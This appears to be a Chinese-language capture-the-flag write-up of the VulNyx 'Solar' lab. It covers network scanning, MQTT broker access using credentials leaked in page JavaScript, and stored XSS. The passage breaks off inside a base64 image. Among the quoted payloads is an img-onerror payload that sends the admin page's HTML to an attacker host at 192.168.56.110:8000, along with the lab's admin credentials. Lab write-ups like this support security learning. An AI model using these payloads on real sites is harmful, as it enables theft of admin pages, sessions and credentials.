---
title: VulNyx Solar靶机复盘
author: LingMj
data: 2025-02-21
categories: [VulNyx]
tags: [xss,mqttx,buster,message,cmd,permit,doas,nodejs,setenv]
description: 难度-Hard
---

## 网段扫描
```
root@LingMj:/home/lingmj# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.56.110
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:12       (Unknown: locally administered)
192.168.56.100  08:00:27:5b:72:b4       (Unknown)
192.168.56.159  08:00:27:33:69:92       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.849 seconds (138.45 hosts/sec). 3 responded
```

## 端口扫描

```
root@LingMj:/home/lingmj# nmap -p- -sC -sV 192.168.56.159
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 22:27 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.159
Host is up (0.0036s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 00:31:c1:0a:8b:0f:c9:45:e7:2f:7f:06:0c:4f:cb:42 (ECDSA)
|_  256 6b:04:c5:5d:39:ed:b3:41:d0:23:2b:77:d1:53:d0:48 (ED25519)
80/tcp  open  http     Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.62 (Debian)
|_ssl-date: TLS randomness does not represent time
|_http-title: Solar Energy Control Login
| ssl-cert: Subject: commonName=www.solar.nyx/organizationName=Solar/stateOrProvinceName=Madrid/countryName=ES
| Subject Alternative Name: DNS:www.solar.nyx, DNS:www.sunfriends.nyx
| Not valid before: 2024-10-10T00:03:30
|_Not valid after:  2034-10-08T00:03:30
MAC Address: 08:00:27:33:69:92 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.06 seconds
```

## 获取webshell

![图 0](../assets/images/59fade1960e5efd2184470302ccf925cf6258ef401aea85e66787c03dd090afe.png)  
![图 1](../assets/images/9ebdc5b7b11c7a7f17ee3234049f2831051ef84a953933a518f97f4d6b282a6d.png)  

>爆破么？不过可以先看443端口
>

![图 2](../assets/images/e0a23c3b0030dfcf132bb49800155863b8cef2023943536e78e24d796fa2e411.png)  
![图 3](../assets/images/e2830668a4fbbb27fde775f75ba319d375f8478d2cd1fc824d3111c41c872331.png)  
![图 4](../assets/images/708f1b23b15c75951a995e528a98dabe1750a8dfbc9f4c9393a705ffd5495500.png)  

>没有直接的443，好像就是一个简单的域名而已，先保留想法继续往下做了
>

![图 5](../assets/images/2581aca3a0a5d018b89c4298acc3e94d25d925ffa0c3427dcd3e3f483d0586bc.png)  
![图 6](../assets/images/b7552eef9e3b38e77b1a5094144c7e4ba8aa2a6f0be81c960e89db8c0f79c9e0.png)  

>先爆破用户名一手
>
![图 7](../assets/images/6b1b79523b784515e406541c21aa6798e7f1e4a350e758dcb9e952da528b342f.png)  
![图 8](../assets/images/9b4e78c8bffc492cb30e069ee827befbfe5ce80e7b434464f47f4440d6fe8299.png)  
![图 9](../assets/images/c660cb593658a24175e0661cd92fb0d213ad4f517bcf55a703e285f78004a04f.png)  

>这爆破我也不知道咋整啊，记得一个用户是管理员用户的名字试一下，在昨天的love靶机里同一个作者应该会有一些设计同点
>

![图 10](../assets/images/f637353291e8cb652287fedceb145eb2119aa35de6ff1e2ad9338e5db487d3a7.png)  

>看到了但是没用现在完全不知道用户名
>

![图 11](../assets/images/68a8ee2e3c7e8aa949c9221412ff2b038b5cb2b3605281b8f83819ead0e46371.png)  

>cookie啥也没有可以考虑上面msg的地方拼接什么或者扫域名了
>

![图 12](../assets/images/96be5c2992cbf483b22fca4ba13570f2d9f497b34bd5bbbcb5192e3cddea6cf9.png)  
![图 13](../assets/images/27d86d0fcc39ce2a1b7e9c379af16ea4f1e4bf6fab84a5a4179250affa09b11b.png)  

>能说不在80这但是网页也没有指向443的地方有点复杂了
>

![图 14](../assets/images/6fc7f748f7c543d8320fffa96b347429ad031f9b3f8ac36b6534ac7e6800ff88.png)  

>可以控制就看看能带出什么信息了
>
![图 15](../assets/images/49ed3f6f591ec38d7624d17b5d6bf76f45522498cd18394068b4aeca4c694040.png)  
![图 16](../assets/images/4957649f6e0881822cedc99670ba171668773c0f0778ecc085357013674b73e4.png)  

>貌似我写的不规范，我记得之前做xss的有一个直接找ping的看看有没有这个被执行不回显
>

![图 17](../assets/images/1dd6f6854574592fd29202fdfbf1a0e49a4c3cff1cac394c4d75f681e2661c54.png)  
![图 18](../assets/images/7eb073f85114d094f5c3a44ddd6e9b19730216675fa639307e74a5f8d53a2de5.png)  
![图 19](../assets/images/d33af1f6eb01e35537e1d58c2d1684c6792fefed19e20ce76677093d0a7f5802.png)  

>无在看看那里能进行测试了
>

![图 20](../assets/images/0c73dbc460e6d5f86f635c10b27a7f92778bc0efd4d0b2727f991b24db5d831e.png)  
![图 21](../assets/images/8623143ff1d0538806283827be9a25a9c05d78b20d9ccef98f7f4129e1592598.png)  

>好了我的路好像死了，我去扒拉扒拉聊天记录了，感觉没想法了，没有有用的前面被秒了我看看域名先吧
>

![图 22](../assets/images/0d1982e2263cd37dcbe4d31879cd2a8d2a901c02706b7377da4e1fb68800ff88.png)  
![图 23](../assets/images/77b2208e6fb9418e317cdbd36229dd8a8e28eea4d42c37c5e40a4d5e5a7a8544.png)  

>投降看一下wp，看看哪里有问题
>
![图 25](../assets/images/105a1db79bcab5a1151b3b4ac06e2e1274efe1a214523db7c9618c76bd27db3c.png)  

![图 24](../assets/images/0b9fd141829d5fa5f183c642e7d9da53535b69e7e0925b9aa1ee8bb4936133ad.png)  

>我以为一直不能扫呢，服了没事又学一招
>

![图 26](../assets/images/27caad5905f946418f062df942b0f783e8d1d166e155b3b8e97523617fc1c30b.png)  
![图 27](../assets/images/a7dbfdf085f4e75d317b54544e60d88046f773103fd3330acbb04d4a5f306029.png)  
![图 28](../assets/images/f6d850a34c9cc52e42f1a5eaee0549a6904a828e1bb6b40f56377b4572429613.png)  
![图 31](../assets/images/8db074d7944c4355715c0e2930ae0b74185739a2f39f0af11a6ed98ef2d887b1.png)  

>打了半天入口都没找到头疼
>

![图 29](../assets/images/18a28a54adbe8da9337e8f3cb28b78d78ff0b038a338a3060067e0e9a6d80955.png)  

>可以看到很多用户名
>

![图 30](../assets/images/025795bb05d4f2733b208235bb55cb5aaa6ec17e8c7555f4f8f5e4571cca139b.png)  

>处理一下拿一下用户出来
>

![图 32](../assets/images/404f7d6819e7050c12a77ccb251d469faf7d346e98df3aff72e71d5a2cc90597.png)  
![图 33](../assets/images/297d66c2ac6081875e283738a00b78e9c0ca23cd17f12ed08f413fe7e1c9727e.png)  
![图 34](../assets/images/fe8b0f19d845d1da0f259f69ab995120cd339000a1dbaaeee17b80de993cecce.png)  

>有点丑陋将就看吧
>

![图 35](../assets/images/cef4b5de5ca2df3b81474a3a4f48a9de2eb98df57a9796e19060f8a8cb89ccc9.png)  
![图 36](../assets/images/89a35bae8fe7cb51c76cc550767229ec23466f4093743b71e391b3ae66bca09a.png)  

>可以挨个利用了目前来看没用其他利用的信息了
>

![图 37](../assets/images/9fda6f5cc79fd9e0dd1016df41c8df08e529ff4b36009dc039f4ce106c3ee036.png)  
![图 38](../assets/images/45263a93fc5bb115a6c8e87f7ce309ec71a4991ef51fad8b954023fabd212595.png)  
![图 39](../assets/images/15f745fccdc4c99d9206bfd5a0bf8a4ddbad3349472f879aea71fff7b807d6b1.png)  
![图 40](../assets/images/f1ef17d458df2a8c50331dddfaca7d54b3c3a31af2283d4d9a7e9dc2941a6f84.png)  
![图 41](../assets/images/6b30e80cb121aa78f68322b3c415b70ef537c050beef301f0353f7ce7757cf10.png)  
![图 43](../assets/images/78ef3ff7d1bcd9b7f01d6efffe2597617683e65d63dd17ddd17d81922aa6ddc9.png)  
![图 42](../assets/images/35c0e92b9e48eba6fb6caa6bf8d4ac6e137c119c176df5e3cf617e2364e7639d.png)  

>只有一个存在别的回显应该是登录了
>

![图 44](../assets/images/932be07dabcd6aaca74b2055c3c1a12b01c3ce6d3a73701683d20b80d6e1eede.png)  
![图 45](../assets/images/a3a0038c45f1de6a4907fdf0ac7da337815c7bca7cc9ba8c761b1a7f91184edb.png)  

```
import mqtt from '/mqtt.js'
        
        let userName = "calvin";
        let userRole = "user";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'user',
            password: '1tEa15klQpTx9Oub6ENG',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;
            

            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);
```

![图 46](../assets/images/000ac2657e936e96ddee8e0cf581a33390a8edea04b8d2bcc35cbcd30c9203aa.png)  
![图 47](../assets/images/10113114e8be5668baa3fa1661c8e84d43938d982551b14378c608323a1e9926.png)  

>上面的密码没一个可以登录这边这个，信息的话就用户身份密码还有一个MQTT，一个js
>

![图 48](../assets/images/ce81d00ba6a6a89982f160a5febd83eb2079710ee57078378ac0e26fbe20a9d3.png)  
![图 49](../assets/images/101b143e32f5d67a4f96ba059e883c4148238d01cc8dfefd1d558a97ac98fd1b.png)  
![图 50](../assets/images/d65b1e69c9c92a54c1607da86cdf9214fcfe26d0ddb8ee1b2633d5b758f55f2a.png)  
![图 51](../assets/images/8ef7a8bdb5f1a27c7c9906da3def432ec626bf6f0e5348e6d18e37e32b5b112f.png)  
![图 52](../assets/images/a160aa4df18b9134c2fd1b65c6f0ac9a90159f68b1289d91aeedad753aacef3f.png)  
![图 53](../assets/images/8c61768a4f039a6547a0bca64c2e396b58a59af8ac4ea5b957d3accc61f5d77d.png)  

>又是消息传递，但是不懂咋构造，查了百度告诉我要下载个客户端把域名啥的套进去，我先看看是这个路线不，地址：https://mqttx.app/downloads
>

![图 54](../assets/images/34b1bfc1cd178fdc465261383bb10fdbaeedec0a509295681c3515406279400c.png)  
![图 55](../assets/images/767098678a78b28ba17f8cadf875df632115ecf608d770ba629321afc822d27b.png)  
![图 56](../assets/images/0690161e4e4456e47ae922ca955cc9c21ee7b782ef024403b87a0de8a4b851fa.png)  
![图 57](../assets/images/65447bcd80972e5d5a137dd76445e2f3b4b12f661c4bd7d5d2435152f44cab1f.png)  

>没见连接成功应该是我的问题看看标准的连接形式把
>
>正确的填写方法，错误一点都给你弹来弹去
>
![图 58](../assets/images/61e741784e406674c5b6c099ad68b0d9ea5461da5b268ed8a15ba544cdfe243a.png)  
![图 59](../assets/images/c5e145c8d1031c73ebf6f75ca8f1701fd6cf78d6b5109834cefd31cee54b1ce9.png)  
![图 60](../assets/images/09a4d097368390ba84cb68b2d7e837a12672b6b4b06cd3521bab8518dfbae2d3.png)  
![图 61](../assets/images/bc67169d536593dce004a5576c2088312b61eddf145a9c804d2ca1686284b571.png)  

>可以控制现在就看看咋利用这个消息认证进行反弹shell了，记得之前的commands有东西
>
![图 62](../assets/images/15fa2b4bde3f7e1918eb9680c3531438475ec9526ca97b6fbf7e99db8b921e85.png)  

>发这个东西无果，尝试xss了，这是我做这个靶机之前唯一知道的提示
>

![图 63](../assets/images/dd411b440c899ff68178f44f312a7e3e5fa017fa0067989c3d30e03b5bfbcac0.png)  
![图 64](../assets/images/221a909fa4130556081142d25851369666782e8d1edfc88ca822601896e3f7e3.png)  

>xss对我来说难度有点大了
>
![图 65](../assets/images/0a73979ace03f0f2b81fbd9ebc1bdcf4ae2a314f2226777b36a1d879a26ae90e.png)  

>不想找了用一下wp的xss方案
>

```
"<img src=x onerror=eval(atob(\/[base64encodeJavascriptCode]\/.source)); />"
"<img src=x onerror=\"(async () => {location.href='http://192.168.56.110:8000?url='+encodeURIComponent(window.location.href)+'&code='+btoa(document.body.outerHTML);})();\"; />"
```


![图 67](../assets/images/eb2f22d4e9383c41bc5277353e2d5c6b7485c44da28eb7223224e7903c79034b.png)  

![图 66](../assets/images/f8dcaa1480767ab5ac3221216a06566d171e953200003dbdb9a74560ff0dfd4c.png)  


```
<body>
    <div class="dashboard">
        <object class="solar-icon" data="sun.svg" type="image/svg+xml" style="width:75px;"></object>
        <h1>Solar Energy Dashboard</h1>
        <div class="user-info" id="userInfo"><span>JulianAdm</span><br>admin</div>
        <canvas id="energyChart" class="energy-chart" width="400" height="200" style="display: block; box-sizing: border-box; height: 200px; width: 400px;"></canvas>
        <div class="energy-label"><span class="solar-title">Solar:</span> <span id="solarEnergyLabel" class="energy-value solar"><span class="energy-value solar"><img src="x" onerror="(async () => {location.href='http://192.168.56.110:8000?url='+encodeURIComponent(window.location.href)+'&amp;code='+btoa(document.body.outerHTML);})();" ;=""> kWh</span></span></div>
        <div class="energy-label"><span class="consumed-title">Consumed:</span> <span id="consumedEnergyLabel" class="energy-value consumed"><span class="energy-value consumed">187 kWh</span></span></div>
        <div class="energy-label"><span class="grid-title">Grid:</span> <span id="gridEnergyLabel" class="energy-value grid-positive"><span class="energy-value grid-positive">NaN kWh</span></span></div>
        <a href="/logout.php" class="logout-link" id="logoutLink">Logout</a>
                    <a href="/records/" class="logout-link">Records</a>
            <a href="#" class="logout-link" id="send-record-id">Send record</a>
            </div>

    <!--<script src="/mqtt.min.js"></script>-->
    
    <script src="/chart.js"></script>
    <script type="module">
        import mqtt from '/mqtt.js'
        
        let userName = "JulianAdm";
        let userRole = "admin";

        var mqttclient = mqtt.connect('wss://www.solar.nyx/wss/', {
            clientId: userName + '-dashboard-' + new Date().valueOf(),
            username: 'admin',
            password: 'tJH8HvwVwC57BR6CEyg5',
            protocolId: 'MQTT'
        });

        mqttclient.on("message", getMessagesStatus);

        function getMessagesStatus(msTopic, msBody) {
            let data = JSON.parse(msBody.toString());
            setParams(data.solarEnergy, data.consumedEnergy);
        }

        mqttclient.subscribe("data", function (err) {
            if (err) {
                console.log('ERROR MQTT', err.toString());
                mqttclient.end();
            }
        });

        let solar = 0, consumed = 0, grid = 0;

        // Initialize the bar chart using Chart.js
        const ctx = document.getElementById('energyChart').getContext('2d');
        let energyChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: ['Solar', 'Consumed', 'Grid'],
                datasets: [{
                    label: 'Energy (kWh)',
                    data: [solar, consumed, grid],
                    backgroundColor: ['#6fcf97', '#eb5757', '#56ccf2'],
                }]
            },
            options: {
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            callback: function (value) { return value + " kWh"; }
                        }
                    }
                },
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function (context) {
                                return context.dataset.label + ': ' + context.raw + ' kWh';
                            }
                        }
                    }
                }
            }
        });

        // Update the chart and labels with new data
        function setParams(solarEnergy, consumedEnergy) {
            let gridEnergy = consumedEnergy - solarEnergy;
            solar = solarEnergy;
            consumed = consumedEnergy;
            grid = gridEnergy;
            

            // Update the bar chart
            energyChart.data.datasets[0].data = [solar, consumed, grid];
            energyChart.update();

            // Update labels with specific colors
            document.getElementById('solarEnergyLabel').innerHTML = `<span class="energy-value solar">${solarEnergy} kWh</span>`;
            document.getElementById('consumedEnergyLabel').innerHTML = `<span class="energy-value consumed">${consumedEnergy} kWh</span>`;

            let gridLabel = document.getElementById('gridEnergyLabel');
            gridLabel.innerHTML = `<span class="energy-value ${gridEnergy < 0 ? 'grid-negative' : 'grid-positive'}">${gridEnergy} kWh</span>`;

            document.getElementById('userInfo').innerHTML = `<span>${userName}</span><br>${userRole}`;
        }

        setParams(0, 0);

            // Show message
            function showMessage(msg) {
                const mensajeDiv = document.createElement('div');
                mensajeDiv.classList.add("temp-message")
                mensajeDiv.textContent = msg;
                document.body.appendChild(mensajeDiv);
                setTimeout(() => {
                    mensajeDiv.remove();
                }, 3000);
            }

            // Function to send the record 
            function sendrecord() {
                let btn = document.getElementById('send-record-id');
                if (!btn.disabled) {
                    // Capture the chart as a base64 image
                    let chartImage = energyChart.toBase64Image();

                    mqttclient.publish('record', JSON.stringify({
                        time: new Date().toISOString(),
                        user: {
                            name: userName,
                            role: userRole
                        },
                        solar: solar,
                        consumed: consumed,
                        grid: grid,
                        chart: chartImage
                    }));

                    btn.disabled = true;
                    btn.style.opacity = '0.3';


                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        showMessage('Record was end successfully!')
                    }, 1500);
                }
            }
            document.getElementById('send-record-id').onclick = sendrecord;
    
    </script>


</body>
```

![图 68](../assets/images/a05270b7b107f5b6829f2253dc667fe72b8a2992bd239e7d128ac368a7c379ec.png)  


>又来一个用户，我们可以添加一下,大体我试复现一下，差点给我干走了，所以现在基本图和代码留下来进行的复现操作，不bb了
>

```
"<img src=x onerror=\"document.querySelector(`#send-record-id`).dispatchEvent(new Event('click'));\" />"

```

```
{"time":"2025-02-21T21:34:50.574Z","user":{"name":"JulianAdm","role":"admin"},"solar":235,"consumed":132,"grid":-103,"chart":"data:image/png;base64,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